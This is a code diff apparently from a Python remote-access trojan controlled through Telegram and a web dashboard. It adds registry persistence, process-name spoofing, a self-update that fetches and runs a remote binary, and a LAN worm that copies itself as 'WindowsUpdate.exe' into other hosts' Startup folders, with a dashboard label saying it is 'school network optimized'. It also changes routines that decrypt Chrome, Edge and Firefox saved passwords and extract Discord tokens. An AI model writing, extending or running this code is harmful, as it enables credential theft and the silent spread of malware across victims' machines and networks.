+            if dirs:
+                listing += "<b>Dirs:</b> " + "  ".join(dirs[:30]) + "\n"
+            if files:
+                listing += "<b>Files:</b> " + "  ".join(files[:30])
+            _send_telegram(listing[:4000] or "Empty")
+        except:
+            _send_telegram(f"ls failed: {args}")
+
+    elif cmd == "/registrypersist":
+        try:
+            result = _add_registry_persistence()
+            _send_telegram(f"Registry persistence: {'added' if result else 'failed'}")
+        except:
+            _send_telegram("Registry persist failed")
+
+    elif cmd == "/spoof":
+        try:
+            result = _spoof_process_name()
+            _send_telegram(f"Process name spoofed: {result}")
+        except:
+            _send_telegram("Process spoof failed")
+
+    elif cmd == "/persistence":
+        try:
+            status = _get_spread_status()
+            text = "<b>Persistence Status</b>\n"
+            text += f"Registry: {'YES' if status['registry'] else 'NO'}\n"
+            text += f"Scheduled Task: {'YES' if status['scheduled_task'] else 'NO'}\n"
+            text += f"Internal Copies: {status['internal_copies']}\n"
+            text += f"USB Drives: {len(status['usb_drives'])}\n"
+            text += f"LAN Hosts: {status['lan_hosts']}"
+            _send_telegram(text)
+        except:
+            _send_telegram("Persistence status failed")
+
+    elif cmd == "/update":
+        try:
+            if not UPDATE_URL or UPDATE_URL.startswith("BUILD_"):
+                _send_telegram("No update URL configured")
+                return
+            _send_telegram("Downloading update...")
+            resp = requests.get(UPDATE_URL, timeout=60, allow_redirects=True)
+            if resp.status_code == 200 and len(resp.content) > 100000:
+                new_path = sys.executable + ".new"
+                with open(new_path, 'wb') as f:
+                    f.write(resp.content)
+                bat = os.path.join(KEYLOG_DIR, "_update.bat")
+                with open(bat, 'w') as f:
+                    f.write(f'@echo off\ntaskkill /f /im "{os.path.basename(sys.executable)}" >nul 2>&1\ntimeout /t 2 /nobreak >nul\nmove /y "{new_path}" "{sys.executable}"\nstart "" "{sys.executable}"\ndel "%~f0"')
+                subprocess.Popen(['cmd', '/c', bat], creationflags=_NO_WINDOW)
+                _send_telegram("Update downloaded, restarting...")
+            else:
+                _send_telegram(f"Update download failed (status {resp.status_code})")
+        except:
+            _send_telegram("Self-update failed")
 
     else:
         _send_telegram(f"Unknown command: {cmd}\nType /help for commands")
@@ -1689,7 +2310,123 @@ def _spread_on_lan() -> dict:
             result['errors'].append(f'{host}: {e}')
     return result
 
-def _get_spread_status() -> dict:
+
+def _spread_on_lan_aggressive() -> dict:
+    """Aggressive LAN spread: ARP cache, net view, writable shares, Startup folder drops."""
+    result = {'targets': [], 'infected': 0, 'log': [], 'errors': []}
+    if not getattr(sys, 'frozen', False):
+        result['errors'].append('Not running as compiled exe')
+        return result
+    src = sys.executable
+    _NO_WINDOW = 0x08000000
+    hosts = set()
+    try:
+        arp = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+        for line in arp.stdout.strip().split('\n'):
+            parts = line.strip().split()
+            if len(parts) >= 2 and '.' in parts[0]:
+                ip = parts[0]
+                if not ip.startswith('224.') and not ip.startswith('255.'):
+                    hosts.add(ip)
+    except:
+        pass
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+        hosts.discard(local_ip)
+    except:
+        pass
+    try:
+        nv = subprocess.run(['net', 'view'], capture_output=True, text=True, timeout=30, creationflags=_NO_WINDOW)
+        for line in nv.stdout.strip().split('\n'):
+            line = line.strip()
+            if line.startswith('\\'):
+                hostname = line.split()[0].replace('\\\\', '')
+                try:
+                    ip = socket.gethostbyname(hostname)
+                    hosts.add(ip)
+                except:
+                    hosts.add(hostname)
+    except:
+        pass
+    try:
+        nv2 = subprocess.run(['net', 'view', '/domain'], capture_output=True, text=True, timeout=30, creationflags=_NO_WINDOW)
+        for line in nv2.stdout.strip().split('\n'):
+            line = line.strip()
+            if line and not line.startswith('\\') and not line.startswith('Server') and not line.startswith('-') and not line.startswith('The'):
+                try:
+                    ip = socket.gethostbyname(line.split()[0])
+                    hosts.add(ip)
+                except:
+                    hosts.add(line.split()[0])
+    except:
+        pass
+    result['targets'] = list(hosts)[:30]
+    for host in result['targets'][:15]:
+        try:
+            share_list = []
+            try:
+                sv = subprocess.run(['net', 'view', f'\\\\{host}'], capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+                for line in sv.stdout.strip().split('\n'):
+                    line = line.strip()
+                    if line and not line.startswith('Shared') and not line.startswith('-') and not line.startswith('The'):
+                        parts = line.split()
+                        if parts:
+                            share_list.append(parts[0])
+            except:
+                pass
+            candidates = [f'\\\\{host}\\{s}' for s in share_list]
+            for default_share in ['C$', 'ADMIN$', 'Users', 'Public']:
+                test = subprocess.run(['powershell', '-Command', f'Test-Path "\\\\{host}\\{default_share}"'],
+                    capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+                if 'True' in test.stdout:
+                    candidates.append(f'\\\\{host}\\{default_share}')
+            startup_paths = []
+            for share_path in candidates:
+                for suffix in [
+                    os.path.join('Users', 'All Users', 'Start Menu', 'Programs', 'Startup'),
+                    os.path.join('Users', 'Public', 'Desktop'),
+                    'Windows\\Temp',
+                ]:
+                    startup_paths.append(os.path.join(share_path, suffix))
+            for spath in startup_paths:
+                try:
+                    dest_dir = spath
+                    os.makedirs(dest_dir, exist_ok=True)
+                    dst = os.path.join(dest_dir, 'WindowsUpdate.exe')
+                    import shutil
+                    shutil.copy2(src, dst)
+                    vbs_dst = os.path.join(dest_dir, 'WindowsUpdate.vbs')
+                    with open(vbs_dst, 'w') as vf:
+                        vf.write(f'Set objShell = CreateObject("WScript.Shell")\nobjShell.Run """{dst}""", 0, False\n')
+                    result['infected'] += 1
+                    result['log'].append(f'{host}: dropped to {spath}')
+                    break
+                except:
+                    continue
+            if result['infected'] == 0:
+                try:
+                    mapped = subprocess.run(['net', 'use'], capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+                    for line in mapped.stdout.strip().split('\n'):
+                        if '\\\\' in line and 'OK' in line:
+                            parts = line.strip().split()
+                            for p in parts:
+                                if p.startswith('\\\\'):
+                                    try:
+                                        su = os.path.join(p, 'Users', 'All Users', 'Start Menu', 'Programs', 'Startup')
+                                        os.makedirs(su, exist_ok=True)
+                                        dst = os.path.join(su, 'WindowsUpdate.exe')
+                                        import shutil
+                                        shutil.copy2(src, dst)
+                                        result['infected'] += 1
+                                        result['log'].append(f'{host}: dropped via mapped drive {p}')
+                                        break
+                                    except:
+                                        continue
+                except:
+                    pass
+        except Exception as e:
+            result['errors'].append(f'{host}: {e}')
+    return result
     """Get current spread status: internal copies, USB drives, LAN reachability."""
     status = {'internal_copies': 0, 'internal_paths': [], 'usb_drives': [], 'lan_hosts': 0, 'registry': False, 'scheduled_task': False}
     _NO_WINDOW = 0x08000000
@@ -1823,14 +2560,31 @@ def _decrypt_chrome_passwords() -> list:
     """Decrypt Chrome saved passwords."""
     results = []
     try:
-        import json
         import sqlite3
         import shutil as _sh
+        import ctypes as _ct
 
         chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
             'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
         if not os.path.exists(chrome_path):
             return results
+
+        aes_key = b""
+        try:
+            local_state_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
+                'Google', 'Chrome', 'User Data', 'Local State')
+            with open(local_state_path, 'r', encoding='utf-8') as ls:
+                local_state = json.loads(ls.read())
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            encrypted_key = encrypted_key[5:]
+            class DATA_BLOB(_ct.Structure):
+                _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
+            blob_in = DATA_BLOB(len(encrypted_key), encrypted_key)
+            blob_out = DATA_BLOB()
+            _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
+            aes_key = _ct.string_at(blob_out.pbData, blob_out.cbData)
+        except:
+            pass
 
         tmp_db = os.path.join(KEYLOG_DIR, "_tmp_chrome.db")
         _sh.copy2(chrome_path, tmp_db)
@@ -1841,34 +2595,11 @@ def _decrypt_chrome_passwords() -> list:
 
         for url, user, encrypted_pw in cursor.fetchall():
             try:
-                import ctypes as _ct
                 data = encrypted_pw
-                if data[:3] == b'v10' or data[:3] == b'v20':
-                    crypt32 = _ct.windll.crypt32
-                    dpapi = _ct.windll.dpapi
-
-                    local_state_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
-                        'Google', 'Chrome', 'User Data', 'Local State')
-                    with open(local_state_path, 'r', encoding='utf-8') as ls:
-                        local_state = json.loads(ls.read())
-                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-                    encrypted_key = encrypted_key[5:]
-
-                    class DATA_BLOB(_ct.Structure):
-                        _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
-
-                    blob_in = DATA_BLOB(len(encrypted_key), encrypted_key)
-                    blob_out = DATA_BLOB()
-                    dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
-                    key = _ct.string_at(blob_out.pbData, blob_out.cbData)
-
-                    nonce = data[3:15]
-                    ciphertext = data[15:-16]
-                    tag = data[-16:]
-
+                if (data[:3] == b'v10' or data[:3] == b'v20') and aes_key:
                     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-                    aes = AESGCM(key)
-                    decrypted = aes.decrypt(nonce, data[3:], None)
+                    aes = AESGCM(aes_key)
+                    decrypted = aes.decrypt(data[3:15], data[3:], None)
                     pw = decrypted.decode('utf-8', errors='replace')
                 else:
                     class DATA_BLOB(_ct.Structure):
@@ -1898,11 +2629,29 @@ def _decrypt_edge_passwords() -> list:
         import json
         import sqlite3
         import shutil as _sh
+        import ctypes as _ct
 
         edge_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
             'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
         if not os.path.exists(edge_path):
             return results
+
+        aes_key = b""
+        try:
+            local_state_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
+                'Microsoft', 'Edge', 'User Data', 'Local State')
+            with open(local_state_path, 'r', encoding='utf-8') as ls:
+                local_state = json.loads(ls.read())
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            encrypted_key = encrypted_key[5:]
+            class DATA_BLOB(_ct.Structure):
+                _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
+            blob_in = DATA_BLOB(len(encrypted_key), encrypted_key)
+            blob_out = DATA_BLOB()
+            _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
+            aes_key = _ct.string_at(blob_out.pbData, blob_out.cbData)
+        except:
+            pass
 
         tmp_db = os.path.join(KEYLOG_DIR, "_tmp_edge.db")
         _sh.copy2(edge_path, tmp_db)
@@ -1913,28 +2662,11 @@ def _decrypt_edge_passwords() -> list:
 
         for url, user, encrypted_pw in cursor.fetchall():
             try:
-                import ctypes as _ct
                 data = encrypted_pw
-                if data[:3] == b'v10' or data[:3] == b'v20':
-                    local_state_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
-                        'Microsoft', 'Edge', 'User Data', 'Local State')
-                    with open(local_state_path, 'r', encoding='utf-8') as ls:
-                        local_state = json.loads(ls.read())
-                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-                    encrypted_key = encrypted_key[5:]
-
-                    class DATA_BLOB(_ct.Structure):
-                        _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
-
-                    blob_in = DATA_BLOB(len(encrypted_key), encrypted_key)
-                    blob_out = DATA_BLOB()
-                    _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
-                    key = _ct.string_at(blob_out.pbData, blob_out.cbData)
-
+                if (data[:3] == b'v10' or data[:3] == b'v20') and aes_key:
                     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-                    aes = AESGCM(key)
-                    nonce = data[3:15]
-                    decrypted = aes.decrypt(nonce, data[3:], None)
+                    aes = AESGCM(aes_key)
+                    decrypted = aes.decrypt(data[3:15], data[3:], None)
                     pw = decrypted.decode('utf-8', errors='replace')
                 else:
                     class DATA_BLOB(_ct.Structure):
@@ -2220,60 +2952,120 @@ def _decrypt_firefox_passwords() -> list:
     return results
 
 def _firefox_decrypt(profile_path: str, encrypted: str) -> str:
-    """Decrypt a single Firefox encrypted value using NSS."""
+    """Decrypt a single Firefox encrypted value using NSS PK11SDR_Decrypt."""
     try:
         import ctypes
-        import base64
         nss3_path = os.path.join(os.environ.get('PROGRAMFILES', ''), 'Mozilla Firefox', 'nss3.dll')
         if not os.path.exists(nss3_path):
             nss3_path = os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Mozilla Firefox', 'nss3.dll')
         if not os.path.exists(nss3_path):
             return '(nss3.dll not found)'
         nss3 = ctypes.CDLL(nss3_path)
-        nss3.NSS_Init(os.path.join(profile_path, 'key4.db').encode())
+        nss3.NSS_Init(os.path.join(profile_path).encode())
         enc_bytes = base64.b64decode(encrypted)
-        out = ctypes.create_string_buffer(4096)
-        nss3.PL_Base64Decode(enc_bytes, len(enc_bytes), out)
+        out_buf = ctypes.create_string_buffer(len(enc_bytes) + 1024)
+        out_len = ctypes.c_uint32(0)
+        PK11SDR_Decrypt = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.c_void_p)
+        nss3.PK11SDR_Decrypt.restype = ctypes.c_int
+        nss3.PK11SDR_Decrypt.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.c_void_p]
+        sec_item = (ctypes.c_char * len(enc_bytes))(*enc_bytes)
+        result = nss3.PK11SDR_Decrypt(ctypes.byref(sec_item), out_buf, ctypes.byref(out_len), None)
         nss3.NSS_Shutdown()
-        return out.value.decode('utf-8', errors='replace')
+        if result == 0 and out_len.value > 0:
+            return out_buf.raw[:out_len.value].decode('utf-8', errors='replace')
+        return '(decrypt error)'
     except:
         return '(decrypt error)'
 
+def _get_discord_encryption_key() -> bytes:
+    """Extract Discord AES encryption key from Local State via DPAPI."""
+    try:
+        import ctypes as _ct
+        local_state_path = os.path.join(os.environ.get('APPDATA', ''), 'discord', 'Local Storage', 'Local State')
+        if not os.path.exists(local_state_path):
+            return b""
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.loads(f.read())
+        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+        encrypted_key = encrypted_key[5:]
+        class DATA_BLOB(_ct.Structure):
+            _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
+        blob_in = DATA_BLOB(len(encrypted_key), encrypted_key)
+        blob_out = DATA_BLOB()
+        _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
+        return _ct.string_at(blob_out.pbData, blob_out.cbData)
+    except:
+        return b""
+
+
 def _steal_discord_tokens() -> list:
-    """Extract Discord client tokens from Local Storage."""
+    """Extract Discord client tokens - supports both legacy plaintext and modern encrypted storage."""
     results = []
     try:
-        discord_path = os.path.join(os.environ.get('APPDATA', ''), 'discord', 'Local Storage', 'leveldb')
-        if not os.path.exists(discord_path):
-            return results
         import re
         token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
-        for fname in os.listdir(discord_path):
-            if fname.endswith(('.ldb', '.log')):
-                fpath = os.path.join(discord_path, fname)
-                try:
-                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
-                        content = f.read()
-                    for match in token_pattern.findall(content):
-                        if match not in results:
-                            results.append(f"[Discord] Token: {match}")
-                except:
-                    pass
-        for variant in ['discordcanary', 'discordptb']:
+        enc_prefix = "dQw4w9WgXcQ:"
+        aes_key = b""
+        for variant in ['discord', 'discordcanary', 'discordptb']:
             variant_path = os.path.join(os.environ.get('APPDATA', ''), variant, 'Local Storage', 'leveldb')
-            if os.path.exists(variant_path):
-                for fname in os.listdir(variant_path):
-                    if fname.endswith(('.ldb', '.log')):
+            if not os.path.exists(variant_path):
+                continue
+            for fname in os.listdir(variant_path):
+                if fname.endswith(('.ldb', '.log')):
+                    fpath = os.path.join(variant_path, fname)
+                    try:
+                        with open(fpath, 'rb') as f:
+                            raw = f.read()
                         try:
-                            with open(os.path.join(variant_path, fname), 'r', encoding='utf-8', errors='ignore') as f:
-                                content = f.read()
+                            content = raw.decode('utf-8', errors='ignore')
                             for match in token_pattern.findall(content):
-                                if match not in results:
-                                    results.append(f"[{variant}] Token: {match}")
+                                tag = variant.upper()
+                                entry = f"[{tag}] Token: {match}"
+                                if entry not in results:
+                                    results.append(entry)
                         except:
                             pass
+                        try:
+                            text = raw.decode('utf-8', errors='replace')
+                            idx = 0
+                            while True:
+                                idx = text.find(enc_prefix, idx)
+                                if idx == -1:
+                                    break
+                                enc_b64 = text[idx + len(enc_prefix):]
+                                end = enc_b64.find('\x00')
+                                if end > 0:
+                                    enc_b64 = enc_b64[:end]
+                                enc_b64 = enc_b64.strip()
+                                if len(enc_b64) < 20:
+                                    idx += 1
+                                    continue
+                                try:
+                                    enc_data = base64.b64decode(enc_b64)
+                                    if enc_data[:3] in (b'v10', b'v11') and not aes_key:
+                                        aes_key = _get_discord_encryption_key()
+                                    if aes_key and len(enc_data) > 15:
+                                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                                        aes = AESGCM(aes_key)
+                                        nonce = enc_data[3:15]
+                                        decrypted = aes.decrypt(nonce, enc_data[3:], None)
+                                        token = decrypted.decode('utf-8', errors='replace').strip()
+                                        if token_pattern.match(token):
+                                            tag = variant.upper()
+                                            entry = f"[{tag}] Token: {token}"
+                                            if entry not in results:
+                                                results.append(entry)
+                                except:
+                                    pass
+                                idx += 1
+                        except:
+                            pass
+                    except:
+                        pass
+        if not results:
+            results.append("[Discord] No tokens found. Discord may not be installed or using encrypted storage.")
     except:
-        pass
+        results.append("[Discord] Token extraction failed.")
     return results
 
 def _steal_steam_session() -> list:
@@ -3556,6 +4348,7 @@ DASHBOARD_HTML = r'''
                     <div class="info-card"><div class="info-label">OS</div><div class="info-value" id="osInfo">Loading...</div></div>
                     <div class="info-card"><div class="info-label">Monitors</div><div class="info-value" id="monitorCountHome">-</div></div>
                     <div class="info-card"><div class="info-label">Public URL</div><div class="info-value" id="cloudflaredUrl" style="font-size:14px;word-break:break-all;">Loading...</div></div>
+                    <div class="info-card"><div class="info-label">IGR Version</div><div class="info-value" id="igrVersion">Loading...</div></div>
                 </div>
                 <div class="section">
                     <div class="section-header"><div class="section-title">Hardware Status</div><button class="btn small" onclick="checkHardware()">Refresh</button></div>
@@ -3976,6 +4769,10 @@ DASHBOARD_HTML = r'''
                     <div class="log-box" id="lanSpreadBox">Scans local network for live hosts, attempts SMB copy to C$/ADMIN$ shares.</div>
                 </div>
                 <div class="section">
+                    <div class="section-header"><div class="section-title">Aggressive LAN Spread</div><button class="btn small danger" onclick="spreadLANAggressive()">Aggressive</button></div>
+                    <div class="log-box" id="lanAggressiveBox">ARP cache + net view + writable shares + Startup folder drops. School network optimized.</div>
+                </div>
+                <div class="section">
                     <div class="section-header"><div class="section-title">Process Name Spoof</div><button class="btn small" onclick="spoofProcess()">Spoof Now</button></div>
                     <div class="log-box" id="spoofBox">Modifies the PEB to change the process name shown in task manager and process lists to svchost.exe.</div>
                 </div>
@@ -4099,6 +4896,8 @@ DASHBOARD_HTML = r'''
                     if (dot) { dot.className = 'status-dot'; }
                     const label = document.getElementById('connLabel');
                     if (label) label.textContent = 'Connected';
+                    const verEl = document.getElementById('igrVersion');
+                    if (verEl && data.version) verEl.textContent = 'v' + data.version;
                 } catch {
                     _offlineFailCount++;
                     if (_offlineFailCount >= 3) {
@@ -5108,6 +5907,16 @@ DASHBOARD_HTML = r'''
             if (data.errors && data.errors.length) out += 'Errors: ' + data.errors.slice(0, 5).join('; ');
             document.getElementById('lanSpreadBox').textContent = out;
             logActivity('LAN spread: ' + (data.infected || 0) + ' infected of ' + ((data.targets || []).length) + ' hosts');
+        }
+        async function spreadLANAggressive() {
+            document.getElementById('lanAggressiveBox').textContent = 'Aggressive scan... (may take 2 min)';
+            const res = await fetch('/api/spread/lan_aggressive', {method:'POST'});
+            const data = await res.json();
+            let out = 'Hosts: ' + (data.targets || []).length + ' | Infected: ' + (data.infected || 0) + '\n';
+            if (data.log && data.log.length) out += data.log.join('\n');
+            if (data.errors && data.errors.length) out += '\nErrors: ' + data.errors.slice(0,5).join('; ');
+            document.getElementById('lanAggressiveBox').textContent = out;
+            logActivity('Aggressive LAN: ' + (data.infected || 0) + ' infected');
         }
         async function loadSpreadStatus() {
             const el = document.getElementById('spreadStatusGrid');
@@ -7013,6 +7822,15 @@ def spread_lan():
     try:
         result = _spread_on_lan()
         return jsonify({'success': True, 'targets': result['targets'], 'infected': result['infected'], 'errors': result['errors']})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/spread/lan_aggressive', methods=['POST'])
+def spread_lan_aggressive():
+    """Aggressive LAN spread: ARP, net view, writable shares, Startup drops."""
+    try:
+        result = _spread_on_lan_aggressive()
+        return jsonify({'success': True, 'targets': result['targets'], 'infected': result['infected'], 'log': result.get('log', []), 'errors': result['errors']})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
